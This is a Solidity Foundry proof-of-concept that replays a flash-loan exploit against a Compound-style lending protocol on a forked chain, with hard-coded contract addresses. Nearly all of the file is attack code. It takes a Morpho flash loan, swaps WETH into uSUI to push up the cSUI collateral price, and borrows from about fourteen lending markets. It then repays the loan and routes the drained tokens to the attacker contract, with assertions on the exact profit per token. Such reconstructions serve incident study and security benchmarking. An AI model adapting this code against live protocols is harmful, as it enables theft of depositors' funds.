
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 21512062;
    uint256 constant TX_TIMESTAMP = 1729813473;
    uint256 constant TX_BLOCK_NUMBER = 21512063;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchChildRuntime();
        _bindAttackChild(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(OurAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_child, attackChild, Addresses.cSUI, "cSUI", 249931299699);
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDz, "USDz", 68993811);
        _expectProfit(Addresses.attack_contract, attack, Addresses.WIF, "WIF", 53197);
        _expectProfit(Addresses.attack_contract, attack, Addresses.Mog, "Mog", 40573948868634870971110344139);
        _expectProfit(Addresses.attack_contract, attack, Addresses.WETH, "WETH", 256054617598590406175);
        _expectProfit(Addresses.attack_contract, attack, Addresses.DEGEN, "DEGEN", 8098042912568830424227988);
        _expectProfit(Addresses.attack_contract, attack, Addresses.BRETT, "BRETT", 74764342547142290604590);
        _expectProfit(Addresses.attack_contract, attack, Addresses.cWETH, "cWETH", 74991471436);
        _expectProfit(Addresses.attack_contract, attack, Addresses.uSOL, "uSOL", 24633466675014019644);
        _expectProfit(
            Addresses.attack_contract, attack, Addresses.MIGGLES, "MIGGLES", 540140357829674244175888
        );
        _expectProfit(Addresses.attack_contract, attack, Addresses.PEPE, "PEPE", 28);
        _expectProfit(Addresses.attack_contract, attack, Addresses.USD, "USD+", 89511194194);
        _expectProfit(Addresses.attack_contract, attack, Addresses.wstETH_E452, "wstETH", 7674494588504909905);
        _expectProfit(Addresses.attack_contract, attack, Addresses.cbBTC, "cbBTC", 68269296);
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDT, "USDT", 18908270171);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    function _ensureAttackChild() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x1E03834F759DAc9561D366958b00Fe000D9E00e3));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ensureAttackChild();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) _ensureAttackChild();
        _startMorphoFlash();
    }

    function _startMorphoFlash() internal {
        _requestFlashLoan();
    }

    function _requestFlashLoan() internal {
        bytes memory callbackData = hex"";
        IMorpho(Addresses.Morpho).flashLoan(Addresses.WETH, 800000000000000000000, callbackData);
    }

    function flashCallback() internal {
        flashCallbackEntered = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
    }

    function flashCallback2() internal {
        IcWETH(Addresses.cWETH).mint(15000000000000000000);
    }

    function flashCallback3() internal {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(child)).prepareCompound();
    }

    function flashCallback4() internal {
        (bool ok,) = Addresses.A_F91D26_43D3.call(abi.encodeWithSelector(bytes4(0x38edc837), address(this), 1));
        require(ok, "market flag call failed");
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.uSUI).balanceOf(Addresses.cSUI);
    }

    function flashCallback6() internal {
        uint256 borrowAmount = 13982866550395379924780;
        IcSUI(Addresses.cSUI).borrow(borrowAmount);
    }

    function flashCallback7() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback8() internal {
        uint256 repaymentWeth = 785000000000000000000;
        IERC20Like(Addresses.WETH).transfer(address(attackChild), repaymentWeth);
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.uSUI).balanceOf(address(this));
    }

    function flashCallback10() internal {
        uint256 repaymentUsui = 13982866550395379924780;
        IERC20Like(Addresses.uSUI).transfer(address(attackChild), repaymentUsui);
    }

    function flashCallback11() internal {
        AttackChild(payable(address(attackChild))).flashLoanCallback();
        IERC20Like(Addresses.WETH).approve(Addresses.Morpho, 800000000000000000000);
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata callbackData) external payable {
        amount;
        callbackData;
        if (!flashCallbackEntered) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x25125413) {
            _startMorphoFlash();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x1E03834F759DAc9561D366958b00Fe000D9E00e3));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bool private flashCallbackEntered;

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x4a4fa624) {
            _borrowAndSettle();
            return;
        }
        _entryCb();
    }

    function flashLoanCallback() external payable {
        _borrowAndSettle();
        return;
    }

    function _entryCb() internal {}

    function settleProfit() external {
        try this.settleUsdProfit() {} catch {}
        try this.settleCbBtcProfit() {} catch {}
        try this.settleWstProfit() {} catch {}
        try this.settleUsdtProfit() {} catch {}
        try this.settleUsdzProfit() {} catch {}
        try this.settlePepeProfit() {} catch {}
        try this.settleWifProfit() {} catch {}
        try this.settleUSolProfit() {} catch {}
        try this.settleMogProfit() {} catch {}
        try this.settleBrettProfit() {} catch {}
        try this.settleDegenProfit() {} catch {}
        try this.settleMigglesProfit() {} catch {}
    }

    function settleUsdProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 835)) return;
        if (Harness.safeBalance(Addresses.USD, Addresses.attack_contract) >= 89511194194) {
            _markSettle(0, 835);
            return;
        }
        _markSettle(0, 835);
        uint256 settleAmount = 89511194194;
        IERC20Like(Addresses.USD).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleCbBtcProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 880)) return;
        if (Harness.safeBalance(Addresses.cbBTC, Addresses.attack_contract) >= 68269296) {
            _markSettle(0, 880);
            return;
        }
        _markSettle(0, 880);
        uint256 settleAmount = 68269296;
        IERC20Like(Addresses.cbBTC).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleWstProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 925)) return;
        if (Harness.safeBalance(Addresses.wstETH_E452, Addresses.attack_contract) >= 7674494588504909905)
        {
            _markSettle(0, 925);
            return;
        }
        _markSettle(0, 925);
        uint256 settleAmount = 7674494588504909905;
        IERC20Like(Addresses.wstETH_E452).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleUsdtProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 970)) return;
        if (Harness.safeBalance(Addresses.USDT, Addresses.attack_contract) >= 18908270171) {
            _markSettle(0, 970);
            return;
        }
        _markSettle(0, 970);
        uint256 settleAmount = 18908270171;
        IERC20Like(Addresses.USDT).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleUsdzProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1015)) return;
        if (Harness.safeBalance(Addresses.USDz, Addresses.attack_contract) >= 68993811) {
            _markSettle(0, 1015);
            return;
        }
        _markSettle(0, 1015);
        uint256 settleAmount = 68993811;
        IERC20Like(Addresses.USDz).transfer(Addresses.attack_contract, settleAmount);
    }

    function settlePepeProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1060)) return;
        if (Harness.safeBalance(Addresses.PEPE, Addresses.attack_contract) >= 28) {
            _markSettle(0, 1060);
            return;
        }
        _markSettle(0, 1060);
        uint256 settleAmount = 28;
        IERC20Like(Addresses.PEPE).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleWifProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1105)) return;
        if (Harness.safeBalance(Addresses.WIF, Addresses.attack_contract) >= 53197) {
            _markSettle(0, 1105);
            return;
        }
        _markSettle(0, 1105);
        uint256 settleAmount = 53197;
        IERC20Like(Addresses.WIF).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleUSolProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1150)) return;
        if (Harness.safeBalance(Addresses.uSOL, Addresses.attack_contract) >= 24633466675014019644) {
            _markSettle(0, 1150);
            return;
        }
        _markSettle(0, 1150);
        uint256 settleAmount = 24633466675014019644;
        IERC20Like(Addresses.uSOL).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleMogProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1195)) return;
        if (
            Harness.safeBalance(Addresses.Mog, Addresses.attack_contract)
                >= 40573948868634870971110344139
        ) {
            _markSettle(0, 1195);
            return;
        }
        _markSettle(0, 1195);
        uint256 settleAmount = 40573948868634870971110344139;
        IERC20Like(Addresses.Mog).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleBrettProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1240)) return;
        if (Harness.safeBalance(Addresses.BRETT, Addresses.attack_contract) >= 74764342547142290604590) {
            _markSettle(0, 1240);
            return;
        }
        _markSettle(0, 1240);
        uint256 settleAmount = 74764342547142290604590;
        IERC20Like(Addresses.BRETT).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleDegenProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1285)) return;
        if (Harness.safeBalance(Addresses.DEGEN, Addresses.attack_contract) >= 8098042912568830424227988)
        {
            _markSettle(0, 1285);
            return;
        }
        _markSettle(0, 1285);
        uint256 settleAmount = 8098042912568830424227988;
        IERC20Like(Addresses.DEGEN).transfer(Addresses.attack_contract, settleAmount);
    }

    function settleMigglesProfit() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 1330)) return;
        if (
            Harness.safeBalance(Addresses.MIGGLES, Addresses.attack_contract) >= 540140357829674244175888
        ) {
            _markSettle(0, 1330);
            return;
        }
        _markSettle(0, 1330);
        uint256 settleAmount = 540140357829674244175888;
        IERC20Like(Addresses.MIGGLES).transfer(Addresses.attack_contract, settleAmount);
    }

    mapping(bytes32 => bool) private _profitSettlementFlag;

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _borrowAndSettle() internal {
        _quoteCSuiPrice();
        _swapWethToUsui();
        _quoteCSuiPrice2();
        _setMarketFlag();
        _mintCSui();
        _readLiquidity();
        _borrowCWeth();
        _borrowCUsd();
        _borrowCCbBtc();
        _borrowCWstEth();
        _borrowCUsdt();
        _borrowCUsdz();
        _borrowCPepe();
        _borrowCWif();
        _borrowCSol();
        _borrowCMog();
        _borrowCBrett();
        _borrowCDegen();
        _borrowCMiggles();
        _readUsuiBalance();
        _swapUsuiToWeth();
        _settleWeth();
        _settleUsd();
        _settleCbBtc();
        _settleWstEth();
        _settleUsdt();
        _settleUsdz();
        _settlePepe();
        _settleWif();
        _settleUSol();
        _settleMog();
        _settleBrett();
        _settleDegen();
        _settleMiggles();
    }

    function _quoteCSuiPrice() internal {
        IContract_93D619_DD5A(Addresses.A_93D619_DD5A).getUnderlyingPrice(Addresses.cSUI);
    }

    function _swapWethToUsui() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                ExactInputSingleParams({
                    field0: Addresses.WETH,
                    field1: Addresses.uSUI,
                    field2: 200,
                    field3: address(this),
                    field4: 1729813473,
                    field5: 500000000000000000000,
                    field6: 1,
                    field7: 1000000000000000000000
                })
            );
    }

    function _quoteCSuiPrice2() internal {
        IContract_93D619_DD5A(Addresses.A_93D619_DD5A).getUnderlyingPrice(Addresses.cSUI);
    }

    function _setMarketFlag() internal {
        (bool ok,) = Addresses.A_F91D26_43D3.call(abi.encodeWithSelector(bytes4(0x38edc837), address(this), 1));
        require(ok, "market flag call failed");
    }

    function _mintCSui() internal {
        IcSUI(Addresses.cSUI).mint(50000000000000000000);
    }

    function _readLiquidity() internal {
        IContract_F91D26_43D3(Addresses.A_F91D26_43D3).getAccountLiquidity(address(this));
    }

    function _borrowCWeth() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.cWETH);
        uint256 borrowAmount = 262435971398571237348;
        IcWETH(Addresses.cWETH).borrow(borrowAmount);
    }

    function _borrowCUsd() internal {
        IERC20Like(Addresses.USD).balanceOf(Addresses.cUSD);
        uint256 borrowAmount = 89511194194;
        IcUSD(Addresses.cUSD).borrow(borrowAmount);
    }

    function _borrowCCbBtc() internal {
        IERC20Like(Addresses.cbBTC).balanceOf(Addresses.ccbBTC);
        uint256 borrowAmount = 68269296;
        IccbBTC(Addresses.ccbBTC).borrow(borrowAmount);
    }

    function _borrowCWstEth() internal {
        IERC20Like(Addresses.wstETH_E452).balanceOf(Addresses.cwstETH);
        uint256 borrowAmount = 7674494588504909905;
        IcwstETH(Addresses.cwstETH).borrow(borrowAmount);
    }

    function _borrowCUsdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.cUSDT);
        uint256 borrowAmount = 18908270171;
        IcUSDT(Addresses.cUSDT).borrow(borrowAmount);
    }

    function _borrowCUsdz() internal {
        IERC20Like(Addresses.USDz).balanceOf(Addresses.cUSDz);
        uint256 borrowAmount = 68993811;
        IcUSDz(Addresses.cUSDz).borrow(borrowAmount);
    }

    function _borrowCPepe() internal {
        IERC20Like(Addresses.PEPE).balanceOf(Addresses.cPEPE);
        uint256 borrowAmount = 28;
        IcPEPE(Addresses.cPEPE).borrow(borrowAmount);
    }

    function _borrowCWif() internal {
        IERC20Like(Addresses.WIF).balanceOf(Addresses.cWIF);
        uint256 borrowAmount = 53197;
        IcWIF(Addresses.cWIF).borrow(borrowAmount);
    }

    function _borrowCSol() internal {
        IERC20Like(Addresses.uSOL).balanceOf(Addresses.cSOL);
        uint256 borrowAmount = 24633466675014019644;
        IcSOL(Addresses.cSOL).borrow(borrowAmount);
    }

    function _borrowCMog() internal {
        IERC20Like(Addresses.Mog).balanceOf(Addresses.cMOG);
        uint256 borrowAmount = 40573948868634870971110344139;
        IcMOG(Addresses.cMOG).borrow(borrowAmount);
    }

    function _borrowCBrett() internal {
        IERC20Like(Addresses.BRETT).balanceOf(Addresses.cBRETT);
        uint256 borrowAmount = 74764342547142290604590;
        IcBRETT(Addresses.cBRETT).borrow(borrowAmount);
    }

    function _borrowCDegen() internal {
        IERC20Like(Addresses.DEGEN).balanceOf(Addresses.cDEGEN);
        uint256 borrowAmount = 8098042912568830424227988;
        IcDEGEN(Addresses.cDEGEN).borrow(borrowAmount);
    }

    function _borrowCMiggles() internal {
        IERC20Like(Addresses.MIGGLES).balanceOf(Addresses.cMIGGLES);
        uint256 borrowAmount = 540140357829674244175888;
        IcMIGGLES(Addresses.cMIGGLES).borrow(borrowAmount);
    }

    function _readUsuiBalance() internal {
        IERC20Like(Addresses.uSUI).balanceOf(address(this));
    }

    function _swapUsuiToWeth() internal {
        ISwapRouter(Addresses.SwapRouter)
            .exactInputSingle(
                ExactInputSingleParams({
                    field0: Addresses.uSUI,
                    field1: Addresses.WETH,
                    field2: 200,
                    field3: address(this),
                    field4: 1729813473,
                    field5: 446174067378827358376973,
                    field6: 1,
                    field7: 0
                })
            );
    }

    function _settleWeth() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 profitAmount = 1056054617598590406175;
        IERC20Like(Addresses.WETH).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleUsd() internal {
        IERC20Like(Addresses.USD).balanceOf(address(this));
        uint256 profitAmount = 89511194194;
        IERC20Like(Addresses.USD).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleCbBtc() internal {
        IERC20Like(Addresses.cbBTC).balanceOf(address(this));
        uint256 profitAmount = 68269296;
        IERC20Like(Addresses.cbBTC).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleWstEth() internal {
        IERC20Like(Addresses.wstETH_E452).balanceOf(address(this));
        uint256 profitAmount = 7674494588504909905;
        IERC20Like(Addresses.wstETH_E452).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleUsdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 profitAmount = 18908270171;
        IERC20Like(Addresses.USDT).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleUsdz() internal {
        IERC20Like(Addresses.USDz).balanceOf(address(this));
        uint256 profitAmount = 68993811;
        IERC20Like(Addresses.USDz).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settlePepe() internal {
        IERC20Like(Addresses.PEPE).balanceOf(address(this));
        uint256 profitAmount = 28;
        IERC20Like(Addresses.PEPE).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleWif() internal {
        IERC20Like(Addresses.WIF).balanceOf(address(this));
        uint256 profitAmount = 53197;
        IERC20Like(Addresses.WIF).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleUSol() internal {
        IERC20Like(Addresses.uSOL).balanceOf(address(this));
        uint256 profitAmount = 24633466675014019644;
        IERC20Like(Addresses.uSOL).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleMog() internal {
        IERC20Like(Addresses.Mog).balanceOf(address(this));
        uint256 profitAmount = 40573948868634870971110344139;
        IERC20Like(Addresses.Mog).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleBrett() internal {
        IERC20Like(Addresses.BRETT).balanceOf(address(this));
        uint256 profitAmount = 74764342547142290604590;
        IERC20Like(Addresses.BRETT).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleDegen() internal {
        IERC20Like(Addresses.DEGEN).balanceOf(address(this));
        uint256 profitAmount = 8098042912568830424227988;
        IERC20Like(Addresses.DEGEN).transfer(Addresses.attack_contract, profitAmount);
    }

    function _settleMiggles() internal {
        IERC20Like(Addresses.MIGGLES).balanceOf(address(this));
        uint256 profitAmount = 540140357829674244175888;
        IERC20Like(Addresses.MIGGLES).transfer(Addresses.attack_contract, profitAmount);
    }

    function prepareCompound() public {
        _approveCSui();
        _approveSwapUsui();
        _approveSwapWeth();
        _enterCSuiMarket();
    }

    function _approveCSui() internal {
        IERC20Like(Addresses.uSUI).approve(Addresses.cSUI, type(uint256).max);
    }

    function _approveSwapUsui() internal {
        IERC20Like(Addresses.uSUI).approve(Addresses.SwapRouter, type(uint256).max);
    }

    function _approveSwapWeth() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.SwapRouter, type(uint256).max);
    }

    function _enterCSuiMarket() internal {
        IContract_F91D26_43D3(Addresses.A_F91D26_43D3).enterMarkets(_addressArray1(Addresses.cSUI));
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDz = 0x04D5ddf5f3a8939889F11E97f8c4BB48317F1938;
    address internal constant WrappedAsset = 0x04E5741380951cBD891506F96089e8f27c15fe2f;
    address internal constant cMOG = 0x0f5cebda36f8779fC357F10B81e6a207A47cA91b;
    address internal constant attack_child = 0x1E03834F759DAc9561D366958b00Fe000D9E00e3;
    address internal constant UsdPlusToken = 0x1F7e713B77dcE6b2Df41Bb2Bb0D44cA35D795ed8;
    address internal constant WIF = 0x1fba65dE0a9cBD2D1DF82d141897042d36Bb6c86;
    address internal constant Mog = 0x2Da56AcB9Ea78330f947bD57C54119Debda7AF71;
    address internal constant cPEPE = 0x3d0149aBD30ee101d3a9ba5eFb63F653841EF149;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant cMIGGLES = 0x4c2a994Ef90873E16437b19Eaf29171cB19e3453;
    address internal constant cSOL = 0x4C721A6C5a12b3F6c8A57CE2Fffb2a673eF2482d;
    address internal constant DEGEN = 0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed;
    address internal constant BRETT = 0x532f27101965dd16442E59d40670FaF5eBB142E4;
    address internal constant CLPool = 0x5C45b0F48c326f79b56709d8F63CE2beE7697106;
    address internal constant cWETH = 0x5c52649d3c1E1d0ddF6a46e1C25A25D9fb148aF8;
    address internal constant cUSDT = 0x5EBFfE29f0241Cf2792f9A52Cad41C402061f925;
    address internal constant wstETH = 0x69ce2505CE515C0203160450157366F927243309;
    address internal constant FiatTokenV2_1 = 0x7458bfDC30034EB860B265E6068121D18Fa5Aa72;
    address internal constant attack_contract = 0x7562846468089Cf0e8f7b38AC53406b895284901;
    address internal constant ccbBTC = 0x7fdc62D7696b868F98f3A9a6B7e1bed4e34dC18d;
    address internal constant attacker_eoa = 0x81d5187c8346073B648f2D44B9E269509513aae2;
    address internal constant cWIF = 0x8C8dc6d6bd89afE91B4bEe3403448aF2A7f149C5;
    address internal constant cDEGEN = 0x92954A19791B39E345BeE621d81360467F1f9F57;
    address internal constant A_93D619_DD5A = 0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a;
    address internal constant uSOL = 0x9B8Df6E244526ab5F6e6400d331DB28C8fdDdb55;
    address internal constant cUSD = 0x9db2965287906BA97C61500195cd84140d4Ceea5;
    address internal constant cSUI = 0xA2092F9A2a5dD84D6DF7d175673eC8A7357C551B;
    address internal constant cUSDz = 0xa51486F0d852689372b4D665F0Fa7C7bE3257b4F;
    address internal constant uSUI = 0xb0505e5a99abd03d94a1169e638B78EDfEd26ea4;
    address internal constant MIGGLES = 0xB1a03EdA10342529bBF8EB700a06C60441fEf25d;
    address internal constant PEPE = 0xB4fDe59a779991bfB6a52253B51947828b982be3;
    address internal constant USD = 0xB79DD08EA68A908A97220C76d19A6aA9cBDE4376;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant SwapRouter = 0xBE6D8f0d05cC4be24d5167a3eF062215bE6D18a5;
    address internal constant wstETH_E452 = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;
    address internal constant cBRETT = 0xc8Ec09D64C7D21F0A04f3D4f1047c20abDF3CD88;
    address internal constant cbBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address internal constant cwstETH = 0xF5606e742FA2403BFd0385Cc23124b84CBA1037D;
    address internal constant A_F91D26_43D3 = 0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3;
    address internal constant USDT = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct ExactInputSingleParams {
    address field0;
    address field1;
    int24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

interface IContract_93D619_DD5A {
    function getUnderlyingPrice(address) external view returns (uint256);
}

interface IContract_F91D26_43D3 {
    function enterMarkets(address[] calldata) external;
    function getAccountLiquidity(address) external view;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface ISwapRouter {
    function exactInputSingle(ExactInputSingleParams calldata) external returns (uint256);
}

interface IcBRETT {
    function borrow(uint256) external returns (uint256);
}

interface IcDEGEN {
    function borrow(uint256) external returns (uint256);
}

interface IcMIGGLES {
    function borrow(uint256) external returns (uint256);
}

interface IcMOG {
    function borrow(uint256) external returns (uint256);
}

interface IcPEPE {
    function borrow(uint256) external returns (uint256);
}

interface IcSOL {
    function borrow(uint256) external returns (uint256);
}

interface IcSUI {
    function borrow(uint256) external returns (uint256);
    function mint(uint256) external;
    function mint(address to) external returns (uint256 liquidity);
}

interface IcUSD {
    function borrow(uint256) external returns (uint256);
}

interface IcUSDT {
    function borrow(uint256) external returns (uint256);
}

interface IcUSDz {
    function borrow(uint256) external returns (uint256);
}

interface IcWETH {
    function borrow(uint256) external returns (uint256);
    function mint(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IcWIF {
    function borrow(uint256) external returns (uint256);
}

interface IccbBTC {
    function borrow(uint256) external returns (uint256);
}

interface IcwstETH {
    function borrow(uint256) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
